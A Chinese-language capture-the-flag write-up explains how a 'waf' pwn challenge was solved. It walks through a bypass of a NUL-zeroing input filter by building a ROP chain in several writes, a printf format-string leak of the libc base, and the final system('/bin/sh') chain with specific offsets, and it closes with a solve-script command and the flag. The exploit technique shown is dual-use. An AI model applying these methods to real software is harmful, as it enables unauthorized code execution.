# waf — `K17{ma_a1n7_pr0uD_0f_me_n0_m0r3}`

> "Look ma, I made sure you can't rop no more."

## 那個 "WAF"

```c
void __gets(char *buf) {
    int n = buf[0] ? read(0, buf, strlen(buf)) : read(0, buf, 0x80);
    for (int i = 0; i < n; i++)
        if (buf[i] == 0) { memset(buf + i, 0, n - i); break; }
}

// main:  char buf[0x50];  memset 0;
//        loop { puts(banner); printf(">> "); __gets(buf);
//               if (!strncmp(buf, "exit", 4)) break; }
```

輸入裡只要出現一個 NUL，**從那裡到本次讀取結尾全部被清成 0**。而每個 ROP 位址都必須含
NUL byte（binary 位址 5 個、libc 位址 2 個），所以單發 payload 確實沒得 rop。

## 洞 1：清零範圍只到「本次讀進來的長度」

送 k 個 byte、第一個 NUL 在位置 j，結果是

```
buf[0..j) = 我們的資料
buf[j..k) = 0          <- memset 幫我們把 0 寫出來了
buf[k..)  = 原封不動
```

而且迴圈允許無限次寫入。所以**從高位移往低位移、一次疊一個 qword**，
每次的清零都只影響「即將被下一次寫入覆蓋」的範圍，已經放好的高位址完全不受影響。

限制：第二次之後 `read` 的長度上限是 `strlen(buf)` = 前一次的 j。
由於每步 k 遞減 8 而 j = k - 2（libc 位址）或 k - 5（binary 位址），條件恆成立。

`buf = rbp-0x50`，回傳位址在 `buf+0x58`。**最後一次寫入必須短於 0x58 bytes**，
否則會把 chain 的第一個 qword 蓋掉（第一版就踩到這個，多跑了一輪才發現）。

## 洞 2：迴圈本身就是第二發的機會

第一發把回傳位址設成 `printf@plt`、下一個 qword 設成 `main`：

- `printf(buf)` —— rdi 由前面的呼叫殘留，內容就是 buffer → **格式字串洩漏**
- 回到 `main` → 緩衝區被重新清零 → 可以用一模一樣的手法組第二發

洩漏結果（實機）：

```
%13$p = 0x7f8a2812d000   <- ld.so base（libc image 長 0x22d000）
%24$p = 0x7f8a27f29d65   <- libc + 0x29d65
```

`0x29d65` 是 `__libc_start_main` 裡 `call 29c30` 的下一道指令，也就是那個 call 壓入的
回傳位址，所以 `libc_base = %24$p - 0x29d65`。

## 一個錯誤的直覺

原本想:「`strncmp(buf,"exit",4)` 之後 rdi 應該還指著 buf，而且它只比對 4 個 byte，
那就讓回傳位址直接是 `system`，buf 寫成 `exitx;cat /flag` —— `exitx` 不是指令會報錯，
後面的 `cat` 照跑。」

**實測是錯的**：把回傳位址換成 `puts@plt` 拿 buffer 內容當測試，印出來的是垃圾而不是我們的
字串——glibc 的 SSE 版 `strncmp` 會動到 rdi。

改用 libc 自己的 gadget：`0x2a145` 落在 `pop r15; ret`（`41 5f c3`）的中間一個 byte，
從那裡開始解碼就是 `pop rdi; ret`。

## 最終 chain

```
buf+0x58 : libc + 0x2a145   pop rdi ; ret
buf+0x60 : libc + 0x1a5ea4  "/bin/sh"
buf+0x68 : libc + 0x2a146   ret          <- 對齊修正
buf+0x70 : libc + 0x53110   system
```

`main` 的 `ret` 之後 rsp ≡ 0 (mod 16)，每組 pop/ret 維持不變，多插一個 `ret`
讓 `system` 進入時 rsp ≡ 8，符合 ABI（否則 `movaps` 會炸）。

```bash
WAF_HOST=chal.secso.cc WAF_PORT=4006 python3 challenges/waf/solve.py
```

```
[*] ld base = 0x7fa2... -> libc base = 0x7fa272765000
[*] system = 0x7fa2727b8110
K17{ma_a1n7_pr0uD_0f_me_n0_m0r3}
uid=1000 gid=1000 groups=1000
```
